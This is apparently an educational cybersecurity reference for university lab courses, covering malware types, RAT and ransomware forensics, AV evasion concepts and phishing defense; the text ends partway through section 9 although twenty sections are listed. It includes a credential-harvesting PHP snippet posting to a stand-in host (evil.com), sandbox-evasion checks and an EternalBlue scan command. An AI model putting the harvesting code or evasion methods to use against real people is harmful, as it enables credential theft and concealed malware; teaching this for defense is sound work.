# Comprehensive Cybersecurity Reference Guide

## https://www.youtube.com/watch?v=UWWUVWcu7JQ

### For University Cybersecurity Students | Lab-Based Learning

> **Legal & Ethical Notice:** All techniques in this document are for **educational purposes only**. Practice exclusively on systems you own or have explicit written permission to test — your own VMs, your own websites, Metasploitable2, DVWA, and similar intentionally vulnerable environments. Unauthorized access to any system is illegal under computer crime laws worldwide.

---

## Table of Contents

1. [Lab Environment Setup](#1-lab-environment-setup)
2. [Virtualization & VM Architecture](#2-virtualization--vm-architecture)
3. [Malware — Types, Mechanics & Analysis](#3-malware--types-mechanics--analysis)
4. [Remote Access Trojans (RATs)](#4-remote-access-trojans-rats)
5. [Ransomware — Technical Deep Dive](#5-ransomware--technical-deep-dive)
6. [Malware Obfuscation & AV Evasion](#6-malware-obfuscation--av-evasion)
7. [Malware Forensics & Incident Response](#7-malware-forensics--incident-response)
8. [Phishing — Mechanics & Infrastructure](#8-phishing--mechanics--infrastructure)
9. [Social Engineering — Recognition & Defense](#9-social-engineering--recognition--defense)
10. [Email Security — SMTP, SPF, DKIM, DMARC](#10-email-security--smtp-spf-dkim-dmarc)
11. [Network Anonymity & Identity Hiding](#11-network-anonymity--identity-hiding)
12. [Web Application Security (OWASP Top 10)](#12-web-application-security-owasp-top-10)
13. [Metasploitable2 Full Lab Guide](#13-metasploitable2-full-lab-guide)
14. [Exploit Development Concepts](#14-exploit-development-concepts)
15. [File Format Exploits & Silent Exploits](#15-file-format-exploits--silent-exploits)
16. [Network Forensics with Wireshark](#16-network-forensics-with-wireshark)
17. [Password Attacks & Credential Security](#17-password-attacks--credential-security)
18. [Calling Scams & VoIP Security](#18-calling-scams--voip-security)
19. [Security Awareness Program Design](#19-security-awareness-program-design)
20. [CTF & Further Learning Resources](#20-ctf--further-learning-resources)

---

## 1. Lab Environment Setup

### 1.1 Why a Dedicated Lab Matters

Running malware samples, exploit code, or penetration testing tools on your main machine puts your personal data, banking sessions, and OS at risk. A proper lab:

- **Isolates** dangerous samples from your host
- Lets you **snapshot and revert** to a clean state instantly
- Simulates **multi-machine networks** on one physical computer
- Protects your **host IP** from appearing in any logs

### 1.2 Recommended Lab Architecture

```
┌─────────────────────────────────────────────────────┐
│                   HOST MACHINE                       │
│          (Never run attacks from here)               │
│                                                      │
│  ┌──────────────┐    ┌──────────────┐    ┌────────┐ │
│  │  Kali Linux  │    │Metasploitable│    │Windows │ │
│  │  (Attacker)  │◄──►│     2        │    │ 7 VM   │ │
│  │              │    │  (Victim)    │    │(Victim)│ │
│  └──────────────┘    └──────────────┘    └────────┘ │
│         VMware Workstation / VirtualBox              │
│              Host-Only Network                       │
└─────────────────────────────────────────────────────┘
```

### 1.3 VMware Workstation Setup (Step by Step)

**Installation:**

```
1. Download VMware Workstation Pro (trial) or VirtualBox (free)
2. Install on host machine
3. Create VMs using ISO images
```

**Network Modes — Critical to Understand:**

| Mode          | Description                                       | Use For                                  |
| ------------- | ------------------------------------------------- | ---------------------------------------- |
| **NAT**       | VMs share host internet, hidden behind host IP    | Internet access from VM                  |
| **Host-Only** | VMs talk to each other and host only, no internet | Isolated attack/defense lab              |
| **Bridged**   | VM gets its own IP on your real network           | Testing against physical devices you own |
| **Internal**  | VMs talk only to each other, host excluded        | Fully isolated malware analysis          |

**Recommended for security labs:** Use **Host-Only** so VMs communicate with each other but malware cannot reach the internet or your LAN.

### 1.4 Snapshot Strategy

Snapshots save VM state so you can revert after each exercise:

```
Workflow:
1. Install OS → Install tools → Configure
2. Take "CLEAN BASE" snapshot
3. Run your lab exercise
4. Revert to "CLEAN BASE" → next exercise

In VMware: VM Menu → Snapshot → Take Snapshot → Name it "CLEAN"
Revert:    VM Menu → Snapshot → Revert to Snapshot
```

### 1.5 Required VMs for This Course

| VM                         | Purpose                               | Download                     |
| -------------------------- | ------------------------------------- | ---------------------------- |
| **Kali Linux**             | Attacker / analysis platform          | kali.org                     |
| **Metasploitable 2**       | Intentionally vulnerable Linux target | rapid7.com                   |
| **DVWA**                   | Vulnerable web application            | dvwa.co.uk                   |
| **Windows 7 (evaluation)** | Windows target for malware analysis   | archive.org                  |
| **REMnux**                 | Malware analysis distro               | remnux.org                   |
| **FlareVM**                | Windows malware analysis              | github.com/mandiant/flare-vm |

### 1.6 Resource Allocation Guide

| RAM (Host) | Recommended Setup                    |
| ---------- | ------------------------------------ |
| 8 GB       | Kali + 1 victim VM                   |
| 16 GB      | Kali + 2-3 victim VMs simultaneously |
| 32 GB      | Full lab with 4-5 VMs                |

---

## 2. Virtualization & VM Architecture

### 2.1 How Hypervisors Work

A **hypervisor** (VMware, VirtualBox) creates a software abstraction layer between hardware and guest OS:

```
Physical Hardware (CPU, RAM, Disk, NIC)
         │
    Hypervisor Layer
    ┌────┴──────────────────────┐
    │  Virtual CPU  │ Virtual RAM│
    │  Virtual Disk │ Virtual NIC│
    └───────────────────────────┘
         │              │
    Guest OS 1     Guest OS 2
    (Kali Linux)   (Windows 7)
```

**Type 1 (Bare Metal):** Runs directly on hardware — VMware ESXi, Hyper-V
**Type 2 (Hosted):** Runs inside host OS — VMware Workstation, VirtualBox

### 2.2 VM Isolation Properties

Understanding what IS and IS NOT isolated:

```
ISOLATED (by default):
✓ File system (VM disk ≠ host disk)
✓ Network (with host-only mode)
✓ Registry (Windows VMs)
✓ Malware execution effects

NOT ISOLATED (potential escape vectors):
✗ Shared folders (disable for malware analysis)
✗ Clipboard sharing (disable for malware analysis)
✗ VMware Tools drag-and-drop (disable for malware analysis)
✗ USB passthrough (be careful)
✗ VM escape exploits (rare but real — keep VMware updated)
```

### 2.3 Safe Malware Analysis Configuration

Before analyzing any malware sample:

```bash
# In VMware:
VM Settings → Options → Shared Folders → DISABLED
VM Settings → Options → Guest Isolation → Disable drag-and-drop
VM Settings → Options → Guest Isolation → Disable copy-paste

# Network:
Set to Host-Only or Internal (NO internet access)

# Take snapshot BEFORE opening any sample
VM → Snapshot → Take Snapshot → "PRE-ANALYSIS CLEAN"
```

---

## 3. Malware — Types, Mechanics & Analysis

### 3.1 Malware Taxonomy

```
MALWARE (Malicious Software)
├── Virus          — Self-replicating, attaches to files, damages system
├── Trojan Horse   — Disguised as legitimate, gives attacker remote control
├── RAT            — Remote Access Trojan (subcategory of Trojan)
├── Ransomware     — Encrypts files, demands payment
├── Worm           — Self-replicating across networks, no host file needed
├── Adware         — Forces advertisements, browser hijacking
├── Spyware        — Monitors user silently (keyloggers, screen capture)
├── Rootkit        — Hides malware from OS and AV at kernel level
├── Bootkit        — Infects MBR/UEFI, loads before OS
├── Backdoor       — Persistent unauthorized remote access
├── Dropper        — Downloads and installs other malware
└── Fileless       — Runs in memory only, no disk artifact
```

### 3.2 Virus — Technical Mechanics

A virus requires a **host file** to attach to and **replication** is its defining behavior:

```
Virus Lifecycle:
1. INFECTION  — Appends/prepends code to executable files
2. DORMANCY   — May wait for trigger (date, action, count)
3. TRIGGERING — Activates on condition
4. EXECUTION  — Payload runs (delete files, corrupt data, display message)

File Infection Types:
- Appending virus   → adds code to end of .exe
- Prepending virus  → inserts code at start of .exe
- Cavity virus      → fills unused space within file
- Overwriting virus → destroys original file content
```

**Why viruses are rare now:** Modern OS file permissions, code signing, and AV signature detection make traditional viruses ineffective. Attackers moved to more capable malware.

### 3.3 Worm — Technical Mechanics

Worms spread **autonomously** across networks without user interaction:

```
Worm Propagation:
1. Scans network for vulnerable targets (e.g., port 445 SMB)
2. Exploits vulnerability on target
3. Copies itself to target
4. Target begins scanning → exponential spread

Network impact:
- Broadcast storms from scanning
- Bandwidth saturation
- CPU exhaustion on infected hosts
- Lateral movement across all network segments

Famous worms:
- WannaCry (2017)  — SMB exploit (EternalBlue), spread ransomware
- NotPetya (2017)  — Worm + destructive payload, $10B+ damage
- Conficker (2008) — Infected 9-15 million machines
- Slammer (2003)   — 75,000 hosts in 10 minutes via UDP flood
```

**Lab Exercise:** Analyze WannaCry behavior on isolated Metasploitable2:

```bash
# On Kali - check if target is vulnerable to EternalBlue
nmap -p 445 --script smb-vuln-ms17-010 <target-IP>
```

### 3.4 Trojan Horse — Technical Mechanics

A Trojan **pretends to be something legitimate** while executing malicious code:

```
Trojan Components:
┌─────────────────────────────────────┐
│           TROJAN BINARY             │
│  ┌─────────────┐  ┌───────────────┐ │
│  │  Legitimate │  │  Malicious    │ │
│  │  Function   │  │  Payload      │ │
│  │  (PDF view) │  │  (RAT client) │ │
│  └─────────────┘  └───────────────┘ │
└─────────────────────────────────────┘
       User sees this ↑    Runs hidden ↑

Delivery methods:
- Email attachment (malicious invoice.pdf.exe)
- Drive-by download (compromised website)
- Software bundle (pirated software + malware)
- USB drop attack
- Malicious update notification
```

### 3.5 Spyware & Keyloggers

**Keylogger types:**

| Type              | Method                                     | Detection Difficulty |
| ----------------- | ------------------------------------------ | -------------------- |
| **Kernel-level**  | Hooks at kernel, intercepts all keystrokes | Very Hard            |
| **API-level**     | Uses Windows SetWindowsHookEx API          | Medium               |
| **Form grabbing** | Hooks browser form submission              | Medium               |
| **Acoustic**      | Records keyboard sounds                    | Hard                 |
| **Hardware**      | Physical device between keyboard and PC    | Very Hard            |

**What keyloggers capture:**

- Passwords typed into any application
- Credit card numbers entered in browsers
- Private messages
- Encryption keys
- Bank PINs

**Detection Lab Exercise on your Windows VM:**

```powershell
# Check for suspicious keyboard hooks
Get-Process | Where-Object {$_.Modules | Where-Object {$_.FileName -like "*hook*"}}

# Monitor with Autoruns (Sysinternals)
# Download: https://docs.microsoft.com/sysinternals/downloads/autoruns
# Look for entries highlighted in yellow/red
```

---

## 4. Remote Access Trojans (RATs)

### 4.1 RAT Architecture

A RAT has two components communicating over a network:

```
┌─────────────────────┐         ┌──────────────────────┐
│   ATTACKER MACHINE  │         │    VICTIM MACHINE     │
│                     │         │                       │
│  ┌───────────────┐  │◄───────►│  ┌─────────────────┐ │
│  │  RAT Server   │  │  C2     │  │   RAT Client     │ │
│  │  (Controller) │  │ Channel │  │   (implant)      │ │
│  └───────────────┘  │         │  └─────────────────┘ │
│                     │         │                       │
│  GUI/Console shows: │         │  Runs hidden:         │
│  - Screen capture   │         │  - Captures keystrokes│
│  - File manager     │         │  - Screenshots        │
│  - Keylog viewer    │         │  - Forwards traffic   │
│  - Process list     │         │  - Executes commands  │
└─────────────────────┘         └──────────────────────┘
```

### 4.2 RAT Connection Types

**Reverse Connection (most common):**

```
Victim → initiates connection → Attacker
Bypasses firewall/NAT on victim side
Attacker listens on a port, victim calls home
```

**Bind Connection (older, less common):**

```
Attacker → initiates connection → Victim
Victim opens listening port
Blocked by most firewalls/NAT
```

### 4.3 Common RAT Capabilities

| Feature                | Technical Description                        |
| ---------------------- | -------------------------------------------- |
| **Screen capture**     | GDI/DirectX screenshot APIs, live VNC stream |
| **Keylogger**          | Windows Hook API or kernel driver            |
| **File manager**       | Full filesystem read/write/execute           |
| **Process manager**    | List, kill, inject into processes            |
| **Password recovery**  | Reads browser credential stores, LSA secrets |
| **Webcam capture**     | DirectShow API access to camera device       |
| **Microphone capture** | Windows Audio APIs                           |
| **Reverse shell**      | CMD/PowerShell forwarded to attacker         |
| **Port forward**       | Tunnel traffic through victim                |
| **Persistence**        | Registry Run keys, scheduled tasks, services |

### 4.4 RAT Persistence Mechanisms

How RATs survive reboots — critical for forensics:

```
PERSISTENCE LOCATIONS (Windows):

1. Registry Run Keys:
   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   HKLM\Software\Microsoft\Windows\CurrentVersion\Run
   HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

2. Scheduled Tasks:
   C:\Windows\System32\Tasks\
   schtasks /query /fo LIST /v

3. Startup Folders:
   C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
   C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

4. Services:
   HKLM\SYSTEM\CurrentControlSet\Services\
   sc query type= all

5. DLL Hijacking:
   Replace legitimate DLL in application directory

6. WMI Subscriptions:
   Survives disk wipe, persists in WMI repository
```

### 4.5 RAT Detection Lab (on your Windows VM)

**Using Sysinternals Suite (free from Microsoft):**

```powershell
# Download Sysinternals: https://docs.microsoft.com/sysinternals

# 1. TCPView - See all network connections with process names
TCPView.exe
# Look for: unknown processes with established outbound connections

# 2. Autoruns - See everything that runs at startup
Autoruns.exe
# Look for: entries in yellow (VirusTotal flagged) or red (not found)
# Common RAT hiding spots: check all tabs especially:
# - Logon tab (Run keys)
# - Scheduled Tasks tab
# - Services tab

# 3. Process Explorer - Detailed process tree
procexp.exe
# Look for: processes with no description, unsigned, or in temp folders
# Right-click process → Check VirusTotal

# 4. Command line check for suspicious connections:
netstat -ano
# -a = all connections, -n = numeric, -o = show PID
# Then match PID to process in Task Manager
```

**Identify a RAT from network behavior:**

```bash
# On Kali - capture traffic from suspect Windows VM
sudo tcpdump -i eth0 -w capture.pcap host <victim-IP>

# Open in Wireshark, look for:
# - Regular beaconing (connects every X seconds/minutes)
# - Encrypted outbound traffic to unknown IP
# - Unusual ports (not 80/443/53)
# - Large data transfers (exfiltration)

# Analyze with Wireshark:
wireshark capture.pcap
# Filter: ip.addr == <suspect-C2-IP>
# Filter: tcp.flags.syn == 1 (see all new connections)
```

### 4.6 RAT Analysis in REMnux/FlareVM

```bash
# Static analysis on suspected RAT binary

# 1. Check file type (never trust extension)
file suspicious.exe
xxd suspicious.exe | head -20  # Check magic bytes

# 2. Strings analysis - extract readable text
strings suspicious.exe | grep -E "(http|https|\.exe|cmd|powershell|registry)"
strings suspicious.exe | grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"

# 3. PE header analysis
pecheck suspicious.exe     # or use CFF Explorer on Windows

# 4. Hash for VirusTotal lookup
md5sum suspicious.exe
sha256sum suspicious.exe
# Submit hash (not file) to virustotal.com

# 5. Import table - what Windows APIs does it use?
# Suspicious imports:
# - CreateRemoteThread (code injection)
# - VirtualAllocEx (allocate memory in another process)
# - WriteProcessMemory (write to another process)
# - SetWindowsHookEx (keylogging)
# - RegSetValueEx (registry persistence)
# - InternetOpen/HttpSendRequest (C2 communication)

# 6. Dynamic analysis - run in isolated VM, monitor with:
# Process Monitor (procmon.exe) - file/registry changes
# Wireshark - network connections
# Regshot - registry snapshot before/after
```

---

## 5. Ransomware — Technical Deep Dive

### 5.1 Ransomware Architecture

```
RANSOMWARE EXECUTION FLOW:

1. DELIVERY    → Email attachment, exploit, RDP brute force
2. EXECUTION   → User runs file or exploit triggers execution
3. PERSISTENCE → Writes to Run key or scheduled task
4. ENUMERATION → Lists all drives, network shares, file types
5. KEY EXCHANGE→ Contacts C2 server, receives public encryption key
                 (or uses hardcoded key — weaker ransomware)
6. ENCRYPTION  → Encrypts files using AES-256 (symmetric)
                 AES key itself encrypted with RSA-2048 (asymmetric)
7. RANSOM NOTE → Drops README.txt or changes wallpaper
8. SHADOW COPY → Deletes VSS (Volume Shadow Copies) to prevent recovery
9. CLEANUP     → May delete original binary
```

### 5.2 Encryption Mechanics

Understanding WHY files cannot be recovered without paying:

```
HYBRID ENCRYPTION USED BY MODERN RANSOMWARE:

Attacker's server:
  - Holds RSA private key (never leaves attacker's control)
  - Generates unique RSA key pair per victim

On victim machine:
  1. Ransomware receives RSA public key from C2
  2. Generates random AES-256 key
  3. Encrypts each file with AES-256 key
  4. Encrypts the AES key with RSA public key
  5. Deletes original AES key from memory
  6. Stores encrypted AES key alongside encrypted file

Without the RSA private key:
  - AES key cannot be decrypted
  - Files cannot be decrypted
  - Brute force of RSA-2048: computationally infeasible

RECOVERY OPTIONS:
  ✓ Offline backups (not connected when ransomware ran)
  ✓ Volume Shadow Copies (if ransomware didn't delete them)
  ✓ Decryption tool (if ransomware was poorly implemented)
  ✓ Law enforcement seized C2 server (rare)
  ✗ Paying ransom (discouraged — funds criminals, no guarantee)
```

### 5.3 Ransomware Defense Strategy

```
BEFORE ATTACK (Prevention):
□ Offline/air-gapped backups (3-2-1 rule)
□ Patch management (most ransomware uses known CVEs)
□ Disable RDP or use VPN + MFA for RDP
□ Email filtering and sandboxing
□ Application whitelisting
□ Least privilege (users not local admins)
□ Disable macros in Office by default
□ Network segmentation

DETECTION:
□ Monitor for mass file modifications (honeypot files)
□ Alert on VSS deletion (vssadmin delete shadows)
□ EDR solutions (CrowdStrike, SentinelOne, Defender ATP)
□ Canary files in sensitive directories

RESPONSE:
□ Isolate infected machine immediately (network cable out)
□ Preserve memory dump before shutdown
□ Identify patient zero and attack vector
□ Restore from clean backups
□ Report to law enforcement (FBI IC3, local cybercrime unit)
```

### 5.4 Lab: Ransomware Behavior Analysis (Safe)

```bash
# Analyze ransomware behavior WITHOUT running it
# Using CAPA (free, by Mandiant):
capa suspicious_ransomware_sample.exe

# Look for capabilities:
# - encrypt file
# - delete volume shadow copies
# - enumerate files
# - communicate with C2

# Dynamic analysis in isolated VM:
# 1. Take snapshot
# 2. Set up Process Monitor with filter on the sample process
# 3. Disable network (host-only, no internet)
# 4. Run sample
# 5. Observe:
#    - Which files get encrypted
#    - What extensions are added
#    - Registry changes
#    - Shadow copy deletion attempt
# 6. Revert snapshot

# Check for shadow copies BEFORE running:
vssadmin list shadows

# Check after (did ransomware delete them?):
vssadmin list shadows
```

---

## 6. Malware Obfuscation & AV Evasion

### 6.1 How Antivirus Detection Works

```
AV DETECTION METHODS:

1. SIGNATURE-BASED (oldest, most common)
   - Hash of known malware stored in database
   - File hash compared against database
   - BYPASS: Modify even 1 byte → different hash

2. HEURISTIC ANALYSIS
   - Looks for suspicious behaviors/code patterns
   - "This code looks like it injects into processes"
   - BYPASS: Obfuscate code flow, avoid suspicious API calls

3. BEHAVIORAL/DYNAMIC ANALYSIS
   - Sandboxes run the file and watches behavior
   - "This file connected to a known C2 IP"
   - BYPASS: Sandbox detection, time delays, environment checks

4. MACHINE LEARNING
   - Statistical model trained on millions of samples
   - BYPASS: Adversarial examples, benign code mixing

5. CLOUD LOOKUP
   - File hash sent to cloud, checked against reputation
   - BYPASS: Never-before-seen files have no reputation
```

### 6.2 Obfuscation Techniques (Technical Understanding)

**Encoding:**

```python
# Simple XOR encoding example (educational)
# Original: MALWARE_STRING
# XOR with key 0x41:
original = b"MALWARE"
key = 0x41
encoded = bytes([b ^ key for b in original])
# Encoded bytes look like garbage to signature scanners
# Decoded at runtime before use
```

**Encryption:**

```
AES encryption of payload:
- Encrypted payload stored in binary (looks like random bytes)
- Decryption stub runs first, decrypts payload into memory
- Payload executes directly from memory (no file on disk)
- AV cannot scan encrypted content → misses detection
```

**Compression:**

```
UPX packing:
- Compresses executable
- Adds decompression stub
- Original code hidden inside compressed data
- Many AV engines unpack UPX → only hides from basic scanners
```

**Polymorphism:**

```
Polymorphic malware:
- Changes its own code on each infection
- May re-encrypt with different key
- Inserts junk instructions (NOP sleds, dead code)
- Same function, different bytes every time
- Defeats signature scanning
```

### 6.3 Detection Ratio Analysis (VirusTotal)

Understanding scan results for defense:

```
VIRUSTOTAL INTERPRETATION:

0/72  = Possibly new malware, FUD (fully undetected), or legitimate file
5/72  = Likely malicious, some AV catching it
35/72 = Clearly malicious, most AV vendors detect it
72/72 = Well-known malware, in databases for years

IMPORTANT FOR DEFENDERS:
- VT shares results WITH AV vendors → helps update signatures
- Never upload sensitive/proprietary files to VT
- For privacy-sensitive analysis: search hash first, don't upload
- VT result ≠ definitive verdict (FPs and FNs exist)

ALTERNATIVE SCANNERS (don't share with AV vendors):
- Hybrid Analysis (hybridanalysis.com) — also dynamic analysis
- Any.run (any.run) — interactive sandbox
- Joe Sandbox (joesandbox.com)
```

### 6.4 Sandbox Detection Techniques

Malware often checks if it's running in a sandbox and behaves differently:

```
SANDBOX EVASION TECHNIQUES MALWARE USES:

1. Time checks:
   - Sleep for 5 minutes before executing
   - Sandboxes often fast-forward time → detected
   - Check system uptime (sandboxes often have low uptime)

2. Human interaction checks:
   - Check mouse movement (sandboxes don't move mouse)
   - Check number of running processes (sandboxes have fewer)
   - Check screen resolution (sandboxes often 800x600)

3. VM detection:
   - Check for VMware registry keys
   - Check for VirtualBox drivers
   - Check MAC address prefix (VMware = 00:0C:29:xx:xx:xx)
   - Check for sandbox-related process names (wireshark.exe, procmon.exe)

4. Environment checks:
   - Check username (sandbox often uses "sandbox", "malware", "analyst")
   - Check computer name
   - Check for recent files (real users have many; sandboxes don't)

DEFENSIVE IMPLICATION:
- Configure analysis VM to look like a real user environment
- Use tools like Speakeasy, FLARE-VM with user artifacts
- Use bare-metal analysis for evasive samples
```

---

## 7. Malware Forensics & Incident Response

### 7.1 Detecting Active RAT Infections

**Step 1: Network Connection Analysis**

```cmd
:: Close all browsers, Skype, Teams, etc. first
:: Then run:
netstat -ano

:: Look for ESTABLISHED connections to unknown IPs
:: Note the PID (last column)

:: Match PID to process:
tasklist /fi "PID eq <PID_NUMBER>"

:: Or use TCPView for GUI version
```

**Step 2: Process Analysis**

```powershell
# List all processes with their file paths
Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize

# Look for:
# - Processes in Temp folders (%TEMP%, %APPDATA%)
# - Processes with generic names (svchost with wrong parent)
# - Processes with no description or unsigned

# Check process parent relationships (use Process Explorer for GUI)
Get-CimInstance Win32_Process | Select-Object Name, ProcessId, ParentProcessId, CommandLine
```

**Step 3: Startup/Persistence Check**

```cmd
:: Autoruns (best tool)
:: Download: https://docs.microsoft.com/sysinternals/downloads/autoruns

:: Command line alternative:
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
schtasks /query /fo LIST /v
sc query type= all state= all
```

**Step 4: File System Analysis**

```powershell
# Find recently created executables in user directories
Get-ChildItem -Path C:\Users -Recurse -Include *.exe,*.dll,*.bat,*.ps1 |
  Where-Object {$_.CreationTime -gt (Get-Date).AddDays(-7)} |
  Select-Object FullName, CreationTime, Length

# Check temp directories
dir %TEMP% /o:d
dir C:\Windows\Temp /o:d
```

### 7.2 Memory Forensics

Memory analysis captures running processes even if malware hides on disk:

```bash
# On REMnux/Kali - Volatility Framework

# Acquire memory dump (from running VM in VMware):
# VMware → VM → Suspend → .vmem file is the memory dump
# Or use DumpIt on Windows target

# Analyze with Volatility 3:
python vol.py -f memory.vmem windows.info          # Basic OS info
python vol.py -f memory.vmem windows.pslist        # Process list
python vol.py -f memory.vmem windows.pstree        # Process tree (spot injections)
python vol.py -f memory.vmem windows.netscan       # Network connections
python vol.py -f memory.vmem windows.malfind       # Find injected code
python vol.py -f memory.vmem windows.cmdline       # Command line of each process
python vol.py -f memory.vmem windows.dlllist       # DLLs loaded by each process

# Extract suspicious process memory:
python vol.py -f memory.vmem windows.memmap --pid <PID> --dump

# Find strings in extracted memory:
strings <dumped_memory_file> | grep -E "(http|cmd|powershell|password)"
```

### 7.3 Incident Response Checklist

```
IMMEDIATE (first 15 minutes):
□ Isolate machine from network (pull cable or disable WiFi)
□ Do NOT turn off machine (lose volatile memory)
□ Take memory dump
□ Document everything you observe
□ Take photos of screen if needed

COLLECTION (15 min - 2 hours):
□ Memory dump (Volatility)
□ Network connections at time of incident (netstat output)
□ Running processes (tasklist, Process Explorer)
□ Autoruns output
□ Event logs (Windows Event Viewer → export)
□ Prefetch files (C:\Windows\Prefetch)
□ Browser history

ANALYSIS:
□ Timeline analysis (when did files appear?)
□ Network traffic analysis (where did it connect?)
□ Malware sample extraction and analysis
□ Identify initial access vector
□ Scope the compromise (what else was accessed?)

CONTAINMENT & RECOVERY:
□ Rebuild from known-clean image
□ Reset all passwords from clean machine
□ Patch the vulnerability used for initial access
□ Monitor for re-infection
```

---

## 8. Phishing — Mechanics & Infrastructure

### 8.1 Phishing Types

```
PHISHING TAXONOMY:

Email Phishing    → Mass emails impersonating legitimate services
Spear Phishing    → Targeted attack on specific individual
Whaling           → Targeted at executives (CEO, CFO)
Smishing          → Phishing via SMS
Vishing           → Phishing via voice call
Pharming          → DNS manipulation, redirects legitimate domain
Clone Phishing    → Copy of legitimate email with malicious links
Business Email    → Compromise executive email, redirect wire transfers
Compromise (BEC)
```

### 8.2 Phishing Page Technical Mechanics

Understanding how phishing pages work (for defense and detection):

```
PHISHING PAGE COMPONENTS:

1. DOMAIN → typosquatted (paypa1.com, arnazon.com)
             lookalike (paypal-secure-login.com)
             subdomain abuse (paypal.evil.com)
             homograph attack (using Unicode chars that look like ASCII)

2. SSL CERTIFICATE → Attackers get free Let's Encrypt certs
                     HTTPS ≠ safe (https://phishing-site.com is still phishing)

3. CLONED PAGE → Saved copy of legitimate site
                 Modified form action to send to attacker

4. FORM ACTION → The critical modification:
   Legitimate: <form action="https://paypal.com/login" method="POST">
   Phishing:   <form action="https://evil.com/harvest.php" method="POST">

5. CREDENTIAL HARVESTING PHP:
   <?php
   $data = $_POST;
   file_put_contents("log.txt", print_r($data, true), FILE_APPEND);
   header("Location: https://real-paypal.com"); // Redirect to real site
   ?>

6. REDIRECT → After capturing creds, victim sent to real site
              Victim assumes they mistyped password
```

### 8.3 Phishing Email Headers — Analysis

Learning to read email headers to identify phishing:

```
FULL EMAIL HEADER ANALYSIS:

Return-Path: <attacker@evil.com>
  ↑ Actual sending address (often different from From:)

Received: from mail.evil.com (mail.evil.com [1.2.3.4])
  ↑ Trace the actual path the email traveled

From: "PayPal Security" <security@paypal-update.com>
  ↑ Display name looks legit, email domain is fake

Reply-To: attacker@gmail.com
  ↑ Replies go here, not to the From address

X-Originating-IP: 192.168.1.1
  ↑ Original sender IP (may be spoofed or VPN)

Authentication-Results: mx.google.com;
  dkim=fail (signature did not verify)
  spf=fail (domain evil.com does not permit 1.2.3.4)
  dmarc=fail
  ↑ CRITICAL: SPF, DKIM, DMARC failures = likely spoofed/phishing

HOW TO VIEW FULL HEADERS:
Gmail: 3-dot menu → Show original
Outlook: File → Properties
Thunderbird: View → Message Source
```

### 8.4 Phishing Infrastructure Analysis

Investigating a phishing site for law enforcement/reporting:

```bash
# Domain investigation:
whois phishing-domain.com          # Registrant info
dig phishing-domain.com A          # IP address
dig phishing-domain.com MX         # Mail servers
dig phishing-domain.com NS         # Name servers

# Historical/reputation:
# - VirusTotal: virustotal.com (search domain)
# - URLScan: urlscan.io (safely browse suspicious URL)
# - Wayback Machine: web.archive.org (when did site appear?)
# - WHOIS history: whoishistory.com

# Certificate transparency (when SSL cert was issued):
# crt.sh/?q=phishing-domain.com

# Check hosting provider:
# abuse@<hosting-provider> — report phishing
# PhishTank: phishtank.com — report and look up
# APWG: apwg.org — Anti-Phishing Working Group

# IP geolocation and ASN:
curl ipinfo.io/<IP>

# Passive DNS (what else is hosted on that IP?):
# VirusTotal → IP tab → Relations
# RiskIQ PassiveTotal (limited free tier)
```

### 8.5 Setting Up a Phishing Detection Lab

Test your own website's susceptibility:

```bash
# GoPhish — Open source phishing simulation framework
# https://getgophish.com

# Install on Kali:
wget https://github.com/gophish/gophish/releases/latest/...
chmod +x gophish
./gophish

# Access admin panel: https://localhost:3333
# Default credentials in gophish.log

# Use to:
# - Test if your own organization's users click phishing links
# - Practice building phishing emails
# - Understand click rates and credential submission rates
# - Generate awareness training

# ONLY use against your own org/systems with permission
```

---

## 9. Social Engineering — Recognition & Defense

### 9.1 Social Engineering Principles

Attackers exploit **human psychology**, not just technology:

```
CIALDINI'S INFLUENCE PRINCIPLES USED IN SE:

1. AUTHORITY    → "I'm calling from Microsoft/your bank/FBI"
                  Defense: Always verify by calling official number independently

2. URGENCY      → "Your account will be suspended in 24 hours"
                  Defense: Urgency is a red flag — slow down, verify

3. SCARCITY     → "This is your last chance to update"
                  Defense: Same as urgency — artificial deadlines = red flag

4. SOCIAL PROOF → "Everyone at your company has already done this"
                  Defense: Verify claims independently

5. RECIPROCITY  → "We're giving you this for free, just verify your account"
                  Defense: Question unexpected gifts/benefits

6. LIKING       → Builds rapport before the attack
                  Defense: Be professional, don't let friendship bypass security
```

### 9.2 Pretexting — How Attackers Build False Identities

```
COMMON PRETEXTS:

1. IT Support:
   "Hi, I'm from IT. We've detected a virus on your computer.
   I need your password to fix it remotely."
   Defense: IT never asks for passwords. Call IT directly to verify.

2. Bank Security:
   "Unauthorized activity detected. Verify your card number/SSN."
   Defense: Banks never ask for full card number over phone. Hang up, call number on card.

3. Government/Law Enforcement:
   "This is the IRS/FBI. You owe back taxes and will be arrested."
   Defense: Government contacts by mail first. Real agencies don't demand immediate payment.

4. Tech Company:
   "Your Windows license has expired. Call Microsoft immediately."
   Defense: Microsoft never cold-calls users. These are always scams.

5. Vendor/Supplier Impersonation:
   "We've updated our bank details. Please send payment to new account."
   Defense: Always verify payment changes via known phone number, not the one they provide.
```

### 9.3 Spear Phishing — Targeted Attack Anatomy

```
HOW A SPEAR PHISHING ATTACK IS BUILT:

RECONNAISSANCE PHASE:
  LinkedIn → Find target's name, role, company, colleagues
  Company website → Understand business, find email format
  Social media → Personal details for tailoring the attack
  Previous breaches → Does target reuse passwords?

CRAFTING THE ATTACK:
  From: "colleague-name@company.com" (spoofed or lookalike)
  Subject: "Q3 Invoice from [real supplier name]"
  Body: References real projects, uses correct internal terminology
  Attachment: invoice_Q3_2024.pdf (actually a malicious file)

WHY IT WORKS:
  - Recipient sees familiar name
  - Content is relevant to their actual job
  - Timing is plausible (end of quarter)
  - From a "trusted" sender

DEFENSE:
  - Email authentication (SPF/DKIM/DMARC)
  - Sandbox all attachments
  - Verify financial requests via phone
  - Security awareness training with simulated attacks
```

### 9.4 Vishing (Voice Phishing) Defense

```
RED FLAGS ON A PHONE CALL:

□ Caller creates urgency or fear
□ Asks for passwords, PINs, or OTP codes
□ Asks you to install remote access software (TeamViewer, AnyDesk)
□ Asks for gift cards or wire transfers
□ Claims to be from Microsoft, Apple, Amazon, government
□ Number looks local but behavior is suspicious (VoIP spoofing)
